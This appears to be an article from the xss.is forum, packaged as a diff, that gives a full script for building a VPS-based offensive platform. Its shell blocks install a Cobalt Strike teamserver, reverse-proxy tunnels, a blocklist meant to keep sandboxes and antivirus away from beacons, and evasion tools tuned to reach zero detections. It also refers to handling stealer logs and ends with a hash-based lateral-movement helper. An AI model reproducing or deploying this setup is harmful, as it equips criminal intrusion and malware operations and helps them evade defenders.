@@ -1,0 +1,760 @@
+https://xss.is/threads/53632/ - might be useful
+ #* working script to create a VPS server for penetration testing from A to Z
+
+
+
+ ## 1.Introduction.
+
+Nowadays information security is the cornerstone of the existence of a corporation, company, business, various state spheres, not necessarily related to IT. Nowadays it is hard to imagine society without computers and networks. They surround us everywhere. We can talk about it for a long time. Reading the terms of the contest and seeing the work of those who have already taken part, I did not really want to distract people from the competition. After the deadline was extended, as mentioned earlier, we talked it over and decided to pump the users up a bit.
+
+The authors of many articles wrote about exploits, bicon compilation and techniques in WD security interfaces, pornography, zero-day vulnerabilities, so-called 0day, etc. I could argue about classification, methods and other trivia, but I decided to write an article that will help the average user to build his own "lab", where he can easily (and most importantly, go to sleep and wake up in a good mood) test the methods of penetration of networks, research "works" of different authors in this direction and do many other things. In general the article is about how to turn a VPS into a pentest lab with a graphical interface and safe work inside.
+
+At first it was a single shebang script that accommodated from and to. Many people were outraged, some accused me of using publick stuff and software. Yes, I do love and use Linux. The distribution license is OpenSource. The rest of the packages are also from the Debian repository (Kali Linux). OpenSource. Lots of code from github (OpenSource). My code snippets and execution in general are OpenSource. If there are talented guys with private-source stuff among those who read this OpenSource article (judging by comments every second here with private-source stuff) - send me a PM. We'll discuss everything that is discussed ;-)
+
+## 2.Installer.
+
+I would like first to say a couple of words about the hardware configuration for comfortable work of the system: 12 processors, 48 RAM and an SSD - this is the machine I was running a similar system, which, in addition to what is described in the article, is also running: BloodHound (besides neo4j also runs parsers for automatic "reception" of data and loading into the database), running parser (it is a very large and complex script), which works in tandem with stealer, filters and breaks data into convenient formats, as well as parser "treats" cookies and immediately generates them in netscape format (cookies in . json format cookies "go in" badly because of presence of special characters and so called escape symbols which break database), besides this different modules of counterattack and active server protection are started. Simultaneously working machines - 5. In general this config will be optimal for up to 5 simultaneously running machines.
+
+git clone https://github.com/l4ckyguy/ukn0w --depth 1 /opt/ukn0w ; cd /opt/ukn0w ; ./build.sh
+
+After we cloned the repository into the folder /opt/ukn0w, we have two options: install the install.sh script immediately, or compile the repository into one convenient installer (this is what we used). After the script does the job the installer file is in the root folder `/root/ukn0w.sh`, it is executed like any other executable file in Linux. After running it, I made a handy installer which will ask you a few questions, check that some settings are correct and initialize the installation of the system on the remote host. You just have to wait for the installation to finish while you drink your coffee in front of your screen (?). So, to avoid unnecessary questions, I'm also posting the installation video from start to finish XD
+
+https://www.youtube.com/watch?v=fmC5FDtEo6k
+Title Video: Full set-up ma super_es
+
+## 3.hostInside
+
+So let's find out what's inside, what is the thing and what does it do? Let's start with preparing the VPS. The first thing I did was to change Debian to Kali with the repositories and configured hostname, /etc/hosts and /etc/hostname correctly
+
+```bash
+home="$(pwd)" ; hname="yourhostna.me" ; hostname "$hname" ; echo "$hname" > /etc/hostname ; echo 127.0.0.1 localhost > /etc/hosts ; echo "$(wget -qO- ipinfo.io/ip)" "$hname" >> /etc/hosts
+                wget -O /tmp/ka.deb https://kali.download/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2020.2_all.deb ; sleep 1 ; dpkg -i /tmp/ka.deb
+        echo 'deb http://kali.download/kali kali-rolling main non-free contrib' > /etc/apt/sources.list ; sleep 10 ; while [[ -n "$(wget -O /tmp/dummy https://repo.x4k.dev/dummy)" ]] ; do sleep 1; done
+```
+
+After that I added SWAP partition - not according to documentation) because almost all VPS providers are not very fond of partitioning operations and hard disks management is a separate topic. After swap, I completely upgraded system, installed required packages and added x86 architecture, for wine to work properly in general
+
+```bash
+# swap
+dd if=/dev/zero of=/swapfile2 bs=1G count=8 ; mkswap /swapfile2 ; chmod 600 /swapfile2 ; swapon /swapfile2
+echo '/swapfile2        none    swap    sw,pri=10       0       0' >> /etc/fstab ; rm /etc/motd &>/dev/null
+
+# upgrade
+apt-get update && apt-get -y dist-upgrade -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" ; touch /root/.hushlogin
+
+# packages
+apt-get -f -y install certbot ipset curl sudo nodejs npm jq golang git unzip python certbot openjdk-11-jdk python2-dev python2 python3-pip python3-dev make \
+htop dnsutils net-tools curl wget zip calc wireguard screen p7zip-full docker.io docker-compose inotify-tools kali-defaults kali-linux-core python-is-python2 \
+ntp wine64 wine nano imagemagick -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" ; systemctl enable docker ; systemctl start docker
+apt-get -y purge apache2
+
+# wine32
+dpkg --add-architecture i386 ; apt-get update ; apt-get -y install wine32
+```
+
+After upgrading and installing packages, it often happens that repositories refuse to update, errors and so on. The main reason is the timing mismatch between the "iron" part of the server and the power provided to you. In addition, I installed python2-pip, which is actively degrading and will soon disappear from the Linux environment completely. The Kali repository no longer has the pip module for python2. And of course, among the first things to change when initializing servers like this (which work with a lot of simultaneously opened files) - I changed the ulimit settings
+
+```bash
+# timedate issue
+systemctl restart ntp.service
+cat<<'EOF'>>/etc/ntp.conf
+server 0.ubuntu.pool.ntp.org
+server 1.ubuntu.pool.ntp.org
+server 2.ubuntu.pool.ntp.org
+server 3.ubuntu.pool.ntp.org
+EOF
+ntpq -p ; timedatectl set-local-rtc 1 ; hwclock --systohc ; sleep 5
+
+# pip2
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py ; python get-pip.py
+
+# ulimit
+echo 'session required        pam_limits.so' >> /etc/pam.d/common-session
+cat<<'EOF'>/etc/security/limits.conf
+*               soft    nofile            655350
+*               hard    nofile            655350
+root            soft    nofile            655350
+root            hard    nofile            655350
+EOF
+```
+
+Next was installed transfer.sh - service, which will allow us to quickly upload any type of files to your server, both through the web interface and using curl. The service will be located on port 4466, so to upload any file to the server and get the link, we just have to run `curl --upload-file /path/to/file yourhostna.me:4466`. The grub boot loader settings were also changed to improve the security of the server. We have set up a dnscrypt-proxy server, which will encrypt our UDP traffic and "distribute" it between dnscrypt-enabled servers. Talking about the fact that they (the servers) have different owners and countries of location I think will be superfluous
+
+```bash
+# transfer.sh
+wget -O /usr/local/bin/transfer.sh $(curl -sL https://api.github.com/repos/dutchcoders/transfer.sh/releases/latest | grep linux-amd64 \
+| grep browser_download_url | head -1 | cut -d \" -f 4) && chmod +x /usr/local/bin/transfer.sh
+
+cat<<'EOF'>/etc/systemd/system/transfer.service
+[Unit]
+Description=transferr
+
+[Service]
+ExecStart=sudo transfer.sh --listener 0.0.0.0:4466 --temp-path /tmp/  --provider local --basedir /tmp --purge-interval 1
+WorkingDirectory=/tmp
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# grub
+cat<<'EOF'>/etc/default/grub
+GRUB_DEFAULT=0
+GRUB_TIMEOUT=0
+GRUB_CMDLINE_LINUX_DEFAULT="elevator=noop ipv6.disable=1 net.ifnames=0 apparmor=1 security=apparmor mce=0 page_poison=1 pti=on mds=full,nosmt audit=1 components union=overlay vsyscall=none init_on_alloc=1 init_on_free=1 l1tf=full,force spectre_v2=on spec_store_bypass_disable=seccomp extra_latent_entropy quiet"
+GRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`
+GRUB_CMDLINE_LINUX="initrd=/install/initrd.gz"
+EOF
+
+update-grub
+
+# DNS-server
+mkdir /tmp/dns && cd /tmp/dns
+wget -nv --show-progress "$(curl -sL https://api.github.com/repos/DNSCrypt/dnscrypt-proxy/releases/latest | grep dnscrypt-proxy-linux_x86_64- | grep browser_download_url \
+| head -1 | cut -d \" -f 4)" && tar xf dnscrypt-proxy-linux_x86_64-* -C /tmp/ ; mv /tmp/linux-x86_64/* /opt/dnscrypt-proxy/ ; ln -s /opt/dnscrypt-proxy/dnscrypt-proxy /bin/ \
+; systemctl disable systemd-resolved ; dnscrypt-proxy -service install ; dnscrypt-proxy -service start
+cd ~ ; rm /etc/resolv.conf ; echo nameserver 127.0.0.1 > /etc/resolv.conf ; chattr +i /etc/resolv.conf
+cat<<'EOF'>/etc/rc.local
+
+#!/bin/bash
+dnscrypt-proxy -service uninstall ; dnscrypt-proxy -service stop
+chattr -i /etc/resolv.conf ; echo nameserver 1.0.0.1 > /etc/resolv.conf
+dnscrypt-proxy -service install ; dnscrypt-proxy -service start ; sleep 3
+echo nameserver 127.0.0.1 > /etc/resolv.conf ; chattr +i /etc/resolv.conf
+sleep 4 ; cd /localhost ; ./up.sh
+EOF
+chmod +x /etc/rc.local
+```
+
+Next, I generated a letsencrypt ssl certificate, which is needed to encrypt and "sign" the traffic, both our bicons and other tools. I wrote a rule to start the timeserver as a systemd service and started the service. This gave me a server startup when the VPS booted and a restart in case of errors.
+
+```bash
+# cobaltstrike section
+cd /opt/cobaltstrike ; rm cobaltstrike.store ; gencert
+cat<<'EOF'>/usr/local/bin/ts
+
+#!/bin/bash
+cd /opt/cobaltstrike ;  hname="$(hostname)"
+java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=41447 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=XHOSTPASSWORD -server -XX:+AggressiveHeap \
+-XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer "$(dig $hname +short A)" XHOSTPASSWORD url.profile "$(date --date='1 year' -u +'%Y-%m-%d')"
+EOF
+chmod +x /usr/local/bin/ts
+
+cat<<'EOF'>/etc/systemd/system/teamserver.service
+[Unit]
+Description=teamserver
+
+[Service]
+ExecStart=sudo /usr/local/bin/ts
+WorkingDirectory=/opt/cobaltstrike
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable teamserver ; systemctl start teamserver
+```
+
+Since our main system and the graphical shell work in a docker environment and use a secure wireguard channel instead of the host network, we need to somehow "push" the right port out. To do this I used FRP (fast reverse proxy) both on the host and inside the docker. On the host side I also created and ran FRP as a systemd service. Also I fixed the sudoers file (not safe, of course, but very useful and also breaking into a linux server always means increasing the local privileges, so I decided to "relax" a bit and used this cheat)
+
+```bash
+# FRP - expose noVNC port
+wget -O /tmp/f.tar https://github.com/fatedier/frp/releases/download/v0.36.2/frp_0.36.2_linux_amd64.tar.gz && tar xf /tmp/f.tar -C /tmp/ && mv /tmp/frp*/frps /usr/bin/
+
+cat<<'EOF'>/usr/local/bin/frps.ini
+[common]
+bind_port = 7000
+EOF
+
+cat<<'EOF'>/etc/systemd/system/frps.service
+[Unit]
+Description=Frp Server Service
+After=network.target
+[Service]
+Type=simple
+User=root
+Restart=on-failure
+RestartSec=5s
+ExecStart=/usr/bin/frps -c /usr/local/bin/frps.ini
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable frps ; systemctl start frps
+
+#sudoers
+cat<<'EOF'> /etc/sudoers
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+root    ALL=(ALL) NOPASSWD: ALL
+gvm     ALL=(ALL) NOPASSWD: ALL
+%sudo   ALL=(ALL) NOPASSWD: ALL
+@includedir /etc/sudoers.d
+EOF
+```
+
+I decided to replace the GVM from the old script with acunetix. The container is fully configured and ready to go. PatrowlHears will be installed if you agree during the initial initial initialization of the script. Also in this "server" part, will build an image of the internal system itself and install a special script that will block access to our server all kinds of sandboxes, anti-viruses and bots, which are designed to reduce the efficiency and liveliness of our bicons)
+
+```bash
+
+
+# acun
+docker pull 0x4k/acunetix
+
+# PATROWL
+function installpatrowl() {
+sleep 20 ; cd /opt ; git clone https://github.com/Patrowl/PatrowlHears  ; cd /opt/PatrowlHears ; docker-compose up -d
+docker-compose exec patrowlhears bash -c 'cd backend_app && ./load_init_data.sh'
+docker-compose exec patrowlhears bash -c 'cd backend_app && ./import_data_updates.sh'
+(crontab -l | grep . ; echo -e "* * */1 * *  cd /opt/PatrowlHears && docker-compose exec patrowlhears bash -c 'cd backend_app && ./import_data_updates.sh'") | crontab -
+}
+# installpatrowl
+
+# super_os
+/etc/init.d/docker restart ; sleep 2 ; cd /opt ; docker build -t kali_suos .
+
+printf "\n\n\033[1;33mЧищу, мою, убираю. Ставлю антипесочницу и перезагружась..\n\033[0m"
+sleep 4 ; apt-get -y autoremove ; apt autoclean
+
+# badboyz
+
+function bbinstall() {
+cat<<'EOF'>/usr/local/bin/goodboyz
+
+#!/bin/bash
+ipset -q flush goodboyz ; ipset -q create goodboyz nethash
+for ip in $(curl -s https://gist.githubusercontent.com/curi0usJack/971385e8334e189d93a6cb4671238b10/raw | \
+grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"); \
+do ipset add goodboyz $ip ; done
+iptables -A INPUT -m set --match-set goodboyz src -j DROP
+iptables -A FORWARD -m set --match-set goodboyz src -j DROP
+EOF
+chmod +x /usr/local/bin/goodboyz ; goodboyz
+}
+bbinstall
+
+sudo -u root reboot
+```
+
+... At this point the host preparation is over, then I want to take a closer look at what's going on inside the OS...
+
+ ## 3.osInside
+
+Here we come to the most interesting part - the container system.
+
+As I said before, the system, as well as other container tools will work via new generation encrypted VPN (however "novelty" is questionable, I personally started using it about 3 years ago and it was "prescribed" in Linux kernel this year, unlike ovpn, which obviously will not get such honors, due to apparent "shoddy" protocol - archiving with encryption key. I will not speak here about "greasy" stack, disgusting speed and other pleasures, for which the protocol is famous openvpn, we will not talk about it), or more precisely through the container network with wireguard running. I also will not copy and paste here the official text, pictures and other bullshit. I will only say a few words about this wonderful protocol. Besides data encryption with advanced algorithms, wg (Wireguard) is also famous for its amazing speed, and its ability to send pretty much any kind of traffic, including the one we need (and some p0f ;-)). It is also very simple (and fast) to connect, its configuration files are understandable even for a child and consist of several values. Here it is - the weapon of the 21st century (again a remark: for me personally there is nothing more beautiful than a weapon - there is not a single superfluous detail, and the whole beauty is in the thoughtfulness and functionality of each line, protrusion or button).
+Due to the fact that the traffic will be encrypted inside the network created by a special container, the "exit" to the host will be done, as I said before, with frp. Because we did not give the docker container the privilege to control the systemd, I wrote a special loader script which looks like this:
+
+```bash
+#!/bin/bash
+x2="p@ssw0rd" ; x4="p@ssw0rd" ; echo root:$x2 | chpasswd ; mkdir -p /root/.vnc ; echo $x4 | vncpasswd -f > /root/.vnc/passwd ; cusw
+chmod 600 /root/.vnc/passwd ; rm -r /tmp/* ; rm -r /root/Downloads/* /root/.zsh_history /root/.zcomp* /root/.ssh/known_hosts /root/.vnc/*.pid /root/.vnc/*.log /tmp/.X11-unix/X1 /tmp/.X1-lock
+unset x1 x2 x4 ; sleep 1 ; sudo chown root:messagebus /usr/lib/dbus-1.0/dbus-daemon-launch-helper ; sudo chmod 4754 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+vncserver :1 -geometry 1560x980 -localhost yes -AlwaysShared ; sleep 3
+while [ -z "$(netstat -antp | grep tiger)" ] ; do vncserver :1 -geometry 1560x980 -localhost yes -AlwaysShared ; sleep 1 ; done
+cd /usr/share/noVNC/utils ; ./novnc_proxy --listen 127.0.0.1:6081 --vnc 127.0.0.1:5901 &
+cat<<EOF>/usr/share/applications/patrowl.desktop
+[Desktop Entry]
+Name=spiderfoot
+Encoding=UTF-8
+Exec=firefox http://$HOSTNAME:8383
+Icon=balena-etcher-electron
+StartupNotify=false
+Terminal=false
+Type=Application
+EOF
+frpc -c /usr/local/bin/frpc.ini &
+killall tigervncconfig ; chmod 1777 /tmp
+spiderfoot -l 127.0.0.1:53137
+```
+
+Well, the FRP service is like this:
+
+```bash
+# FRP
+wget -O /tmp/f.tar https://github.com/fatedier/frp/releases/download/v0.36.2/frp_0.36.2_linux_amd64.tar.gz && tar xf /tmp/f.tar -C /tmp/ && mv /tmp/frp*/frpc /usr/bin/
+
+cat<<EOF>/usr/local/bin/frpc.ini
+[common]
+server_addr = XHOSTNAME
+server_port = 7000
+[vnc]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 6081
+remote_port = 6080
+use_compression = true
+EOF
+```
+
+There are no particularly difficult points to understand here. OK. The container will be built with a Dockerfile and a packed archive installer, which will start automatically after initialization of the VPS. The first part, as always, will be installing the necessary packages and installing the ones we need from the web.
+
+```bash
+export DEBIAN_FRONTEND=noninteractive
+apt-get -y update && apt-get -y dist-upgrade -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
+apt-get -y install kali-desktop-xfce sudo curl perl python-is-python2 python3 nodejs python3-pip python3-dev python2 bash wget git fontconfig mingw-w64 zsh fzf tigervnc-standalone-server dnsutils net-tools wget nano openjdk-11-jdk proxychains crackmapexec xfce4-terminal wine wine64 spiderfoot nmap locales imagemagick xclip -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
+apt-get -y purge resolvconf ; update-alternatives --set x-terminal-emulator /usr/bin/xfce4-terminal.wrapper
+
+cat<<'EOF'>/etc/sudoers
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/sbin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/local/bin:/root/.local/bin:/root/.local/bin:$NPM_PACKAGES/bin:/bin:/usr/llvm-mingw"
+root    ALL=(ALL) NOPASSWD: ALL
+x       ALL=(ALL) NOPASSWD: ALL
+%sudo   ALL=(ALL) NOPASSWD: ALL
+EOF
+
+# install pip2
+
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py ; python get-pip.py
+
+# golang latest
+
+wget -O /tmp/go.tar.gz https://dl.google.com/go/go1.16.5.linux-amd64.tar.gz
+rm -rf /usr/local/go && tar -C /usr/local -xzf /tmp/go.tar.gz ; export GOROOT=/usr/local/go ; export PATH=$PATH:/usr/local/go/bin
+
+# PEzor true install
+
+git clone https://github.com/phra/PEzor /opt/PEzor ; cd /opt/PEzor ; git pull ; sed -i 's+golang++g' install.sh ;  printf "Y" | bash install.sh
+pezc="/opt/PEzor/PEzor.sh" ; sed -i 's+SGN=false+SGN=true+g' $pezc
+sed -i 's+BLOB=false+BLOB=true+g' $pezc ; sed -i 's+FORCED_BITS=false+FORCED_BITS=true+g' $pezc ; sed -i 's+SYSCALLS=false+SYSCALLS=true+g' $pezc
+sed -i 's+UNHOOK=false+UNHOOK=true+g' $pezc ; sed -i 's+ANTIDEBUG=false+ANTIDEBUG=true+g' $pezc ; sed -i 's+SDK=4.0+SDK=4.8+g' $pezc
+echo 'export PATH=$PATH:~/go/bin/:/opt/PEzor:/opt/PEzor/deps/donut_v0.9.3/:/opt/PEzor/deps/wclang/_prefix_PEzor_/bin/' >> /root/.bashrc
+echo 'export PATH=$PATH:~/go/bin/:/opt/PEzor:/opt/PEzor/deps/donut_v0.9.3/:/opt/PEzor/deps/wclang/_prefix_PEzor_/bin/' >> /root/.zshrc
+```
+
+It should be noted that golang (google language) is intentionally taken from the official site, as the Kali repository for some reason there is no fresh version. Also, PEzor was installed and the initial settings were changed. There are two reasons for this. The first and most important one is that PEzor has all the tools I need in the PEzor installer script, such as sgn, donut and wclang. I personally don't particularly like this framework, but someone will always find something to learn and practice here, at least in the ReflectiveLoader application. The topic is really cool, there's a lot of information about it. If you're more or less going to learn the basics of pentest - study it first!
+
+```bash
+
+
+# zsh-terminal-modiifications
+cd ; git clone https://github.com/jotyGill/quickz-sh.git ; cd quickz-sh
+./quickz.sh ; rm -r ../quickz-sh ; fc-cache -fv
+cd /root ; curl -L https://cpanmin.us/ -o /usr/bin/cpanm ; chmod +x /usr/bin/cpanm ; alias cpan=cpanm
+yes | cpan Term::ExtendedColor
+yes | cpan File::LsColor
+git clone git://github.com/trapd00r/ls--.git ; cd ls-- ; perl Makefile.PL ; make && make install ; cp ls++.conf $HOME/.ls++.conf
+chsh --shell=/bin/zsh root
+wget -O /tmp/theme.tar https://gitlab.com/x4k/pub/-/raw/master/theme.tar ; tar xf /tmp/theme.tar -C /usr/share/themes/
+
+# wallz
+wget -O /tmp/wall.zip https://repo.x4k.dev/xss/wallz.zip ; unzip -P 'xss.is' /tmp/wallz.zip -d /opt/
+
+# bat
+sleep 2 ; wget -O /tmp/bat.deb $(curl -sL https://api.github.com/repos/sharkdp/bat/releases/latest | grep amd64.deb | grep -v musl | grep browser_download_url | head -1 \
+| cut -d \" -f 4) && dpkg -i /tmp/bat.deb ; apt-get -y -f install ; echo alias cat="bat --paging never -p --theme 'Monokai Extended Origin'" >> /root/.zshrc
+
+# nanorc
+cd ~; wget -nv --show-progress https://raw.githubusercontent.com/ritiek/nanorc/master/install.sh -O- | bash
+
+# ls_colors
+mkdir /tmp/LS_COLORS && curl -sL https://api.github.com/repos/trapd00r/LS_COLORS/tarball/master | tar xzf - --directory=/tmp/LS_COLORS --strip=1 &> /dev/null
+( cd /tmp/LS_COLORS && sh install.sh ) &> /dev/null
+
+# install icons
+wget -qO- https://git.io/papirus-icon-theme-install | sh
+```
+
+The standard ls, nano, cat were replaced by their modern versions -implementations and I just had to configure and install them. I was also able to install Papirus icons (more colorful than Kali ones, in my opinion), my own black theme. In case someone doesn't like something (and practice shows that 95% of them don't know what they're talking about). Also inside the GUI, the first time you start firefox, the ESR version will change to the regular version, and it will install (with a few modifications I made) https://github.com/arkenfox/user.js/raw/master/user.js. These fox settings will help you surf anonymously and safely. The topic, again, is quite voluminous and the material on it is also a wagon and a small cart, so everyone can find information on the topic easily and effortlessly).
+
+```bash
+# cobaltstrike
+echo 'cd /opt/cobaltstrike && ./start.sh' > /usr/local/bin/cobaltstrike ; chmod +x /usr/local/bin/cobaltstrike
+cat<<'EOF'>/usr/share/applications/cobaltstrike.desktop
+[Desktop Entry]
+Name=Cobalt-Strike
+GenericName=Cobalt-Strike
+Exec=sudo cobaltstrike
+Icon=kali-cadaver
+Terminal=false
+Type=Application
+EOF
+
+# ghidra - NSA reverse
+wget -O /tmp/gh.zip $(curl -sL https://api.github.com/repos/NationalSecurityAgency/ghidra/releases/latest | grep -v musl | grep browser_download_url | head -1 | cut -d \" -f 4)
+unzip /tmp/gh.zip -d /tmp/ ; mv /tmp/ghidra* /usr/share/ghidra
+cat<<'EOF'>/usr/share/applications/ghidra.desktop
+[Desktop Entry]
+Name=ghidra
+Exec=sudo /usr/share/ghidra/ghidraRun
+Icon=ghidra
+StartupNotify=false
+Terminal=false
+Type=Application
+EOF
+
+# rustscan
+wget -O /opt/rustscan.deb $(curl -sL https://api.github.com/repos/RustScan/RustScan/releases/latest | grep amd64.deb | grep -v musl | grep browser_download_url \
+| head -1 | cut -d \" -f 4) && dpkg -i /opt/rustscan.deb ; apt-get -y -f install
+
+# oneforall-install
+cd /opt
+git clone https://github.com/shmilylty/OneForAll.git
+mv OneForAll oneforall
+cd oneforall
+python3 -m pip install -r requirements.txt
+cat<<'EOF'>/usr/bin/oneforall
+#!/bin/bash
+cd /opt/customdir/oneforall
+python3 oneforall.py --target $1 run
+EOF
+chmod +x /usr/bin/oneforall
+
+# pwncat (cytobia not caleb and john hammond)
+python3 -m pip install pwncat pe-tree
+
+# chimera
+git clone https://github.com/tokyoneon/Chimera /opt/chimera --depth 1
+
+# trans - Google-translate-cli
+wget -O /usr/bin/trans git.io/trans && chmod +x /usr/bin/trans
+
+# one-lin3r
+pip3 install one-lin3r pefile
+
+# garble
+GO111MODULE=on go get mvdan.cc/garble
+
+# scarecrow
+git clone https://github.com/optiv/ScareCrow /opt/ScareCrow ; cd /opt/ScareCrow
+apt-get -y install osslsigncode ; go get github.com/fatih/color ; go get github.com/yeka/zip ; go get github.com/josephspurrier/goversioninfo
+go build . ; mv ScareCrow /usr/local/bin ; cd /opt ; rm -r ScareCrow
+
+# Creds - Windows-Helpers
+git clone --raecurse-submodules https://github.com/vxunderground/WinAPI-Tricks /opt/WinAPI-Tricks
+git clone --recurse-submodules https://github.com/S3cur3Th1sSh1t/Creds.git /opt/S3cur3Th1sSh1t
+git clone --recurse-submodules https://github.com/mgeeky/Penetration-Testing-Tools /opt/mcgeeky
+apt-get -y install nishang ; ln -s /usr/share/nishang /opt/nishang
+
+# pe-tree
+pip3 install pe-tree libtmux docutils
+
+# ARSENAL CHEATSHIT
+git clone https://github.com/Orange-Cyberdefense/arsenal.git /usr/share/myarsenal
+ln -s /usr/share/myarsenal/run /usr/local/bin/arsenal ; echo 'alias a="arsenal"' >> /root/.zshrc ; echo "bindkey -s '^g' 'a\n'" >> /root/.zshrc
+
+# install wine32
+dpkg --add-architecture i386 && apt-get update && apt-get -y install wine32 wine64
+
+# TDM-GCC compiller
+wget -O /tmp/tdm.7z https://repo.x4k.dev/tdm.7z ; rm -r /root/.wine &> /dev/null ; mkdir /root/.wine ; cd /root/.wine ; 7z x /tmp/tdm.7z
+```
+
+As you can see from the script, in addition to the cobalt-strike itself, I also installed the following opensource stuff into the system:
+
+* GHIDRA - a utility from the NSA leak, which has become popular (you bet), and I also installed my own github repository. There are no alternatives (well, I'm not taking amateur semi-clones, the real ones really don't exist). Allows if not to decompile a binary, so exactly know what and how it works. However, my current bicons are not up to it yet ;-)
+
+* rustscan - allows you to scan network or ip-address thousands (no joke) times faster than nmap. I mean port knockback. Application?)) Well for example 'rustscan -u 192.168.0.0/16 -p 3309,445' =)
+
+* oneforall - in my opinion, the best and fastest fuzzer for subdomains. it allows to detect networks with the accuracy of a Lombard Jew. however, for some reason (like all modern, more or less serious software) - comes from the Celestial Empire.
+
+* pwncat - netcat for stimulant, the first three letters speak for themselves
+
+* Chimera - obfuscation powershell scripts, has many functions. I personally use it to convert to a numeric format. eg ` chimera -l 3 -d -f /path/to/script.ps1 -o /tmp/obfu.ps1`. Substitute for -d -a and you get the full functionality.
+
+* trans - very handy translator right in the terminal, just as easy to use in practice, for example `trans "Hi, Medved" -t en`
+
+* one-lin3r - also a Twix tool - inside it are many ways to execute/drop/shell the invader. Pretty useful stuff
+
+* garble - go compiler (obfuscator). see full documentation for usage. From personal experience it has 50% efficiency
+
+* scarecrow - amazing utility, written in golang. "works" with EDR active protection components, also inside sources everyone interested can find a lot of interesting things, such as . I will not spoil "dessert", interested - go ahead =)
+
+* also in /opt were cloned repositories of such maestros as mcgeeky and S3cur3Th1sSh1t, plus WINAPI-tricks, peeking into which, everyone will find a lot of useful things. a lot of "ready to use" scripts and programs. If anyone suddenly decides to go even further, I advise to study also corkami (not cloned, the level is slightly higher than expected from the users of this script) - the wizard of modernity Angie changes PE with PNG, PDF, ZIP in a playful way. At my leisure I'm also trying to curb this magical world... I'm having so much success with it))) and nishang - Kali classics already, but it's not less effective ps scripts. By the way, they go well with chimera ;-)
+
+* pe-tree - a fast graphical objdump.
+
+* arsenal - press CTRL+G or just type a and you will get a very basic tutorial about almost all aspects of pentest and the use of Linux in general
+
+* TDM-GCC - mingw for wine with built-in obfuscation like . if you're interested, you'll find out what type, it won't tell the rest of us anything) in practice, it will help you recompile bicons with minimal detects
+Also, in the file /root/.zshrc , which is a configuration file of the active shell (zsh), I added some useful functions, which also can be done in the system terminal:
+    * bmcs - run in the folder with the project csharp-program and project file with extension .sln and you'll get compiled and ready to use (AMSIfail inside) binary in the folder /root/xbuilds with 90% probability
+    * speedtest - the name is quite telling. no need to comment on it.
+    * getlanding site - it sp@zits the page and converts internal links into external ones. Such a feeling, as if just bought on the forum a service - ORDER A LANDING FROM US AND GET A LOOK FOR A BOYSCAT FRAK =)
+    * rnd number - gives out random digit-letters, handy for generating passwords and other code phrases
+    * dn link - very fast file download with aria2
+    * cb file - copies file contents to clipboard.
+    * fb64 file - will convert the contents of the file into base64 format, will put it on the clipboard like this `echo yourbase64 | base64 -d -w0 > /usr/local/bin/yourapp ; chmod +x /usr/local/bin/yourapp'
+
+In /usr/local/bin you can also find:
+    * cusw - wallpaper replacement script
+    * net-obfuscate - a wrapper to get an obfuscation of the .NET executable
+
+## 4.csInside
+
+When you first boot into the graphical shell, run updatecs. The script will automatically load an impressive arsenal of utilities for cobaltstrike, automatically obfuscate binaries with net-obfuscate, and recompile our bi-cons with TDM-GCC (minimizing detects). I suggest everyone who is not indifferent to play with compiler arguments in /opt/cobaltstrike/artifactkit/winebuild.sh - you can get to 0/77 with almost no blood or sweat.
+
+Of course the malleable c2profile belongs more to the second chapter (the server part), but I briefly decided to tell a couple of things here. The only work that was interesting to read was just about profiles (or rather its part), so I highly recommend to pay attention to it, I do not want to take laurels from the author, it is obvious that a person does not indifferent to the subject. Just want to note here that for the survival of the server parameter "host stage" was set to "false". This means that we are deprived of the possibility of creating staged payloads, as well as stager will give in your server - ks, as well as allows any bicon to connect to your system. Rafael fully agrees with me (just kidding, of course) and plans to completely eliminate the possibility of creating such payloads in upcoming versions of CS, which he hints at us using c2lint.
+
+And the last thing I want to tell and suggest - is using and writing .cna scripts and gui script, in conjunction with crackmapexec (look github, the thing is just fire) and SOCKS4 server, running with beacon, let's catch the whole network of a virtual enemy in a short period of time. Video of this action - at my YouTube channel. Below is a sorce. On that note I would like to end on a note: do not be afraid to experiment, add your own pieces of code to my script, add your own containers to the file docker-compose. This is just a rudimentary skeleton of your lab, where you know exactly what you need and what you don't. I also want to say that this article was inspired by people who just say thank you in private and in the comments. And also the admin of this forum. It was his politeness that made me write the first material for xss.is No other forum I visit, nor any other forum at all - . =) In general, all have a good mood))))
+
+```bash
+#!/bin/bash
+
+cat<<EOF>/etc/proxychains.conf
+quiet_mode
+dynamic_chain
+[ProxyList]
+socks4  XHOSTIP 27500
+EOF
+
+zenity --window-icon=/usr/share/icons/Papirus/128x128/apps/clamav.svg  --forms --title="NetworkAbuser" --width="400" --text="Wait for Starting client... in beacon console" \
+--add-entry="network       " --add-entry="username        " --add-entry="hash          "  --add-combo="method" --combo-values="put|inject|execute" &> /tmp/.values
+CIDR="$(cat /tmp/.values | cut -d'|' -f1)"
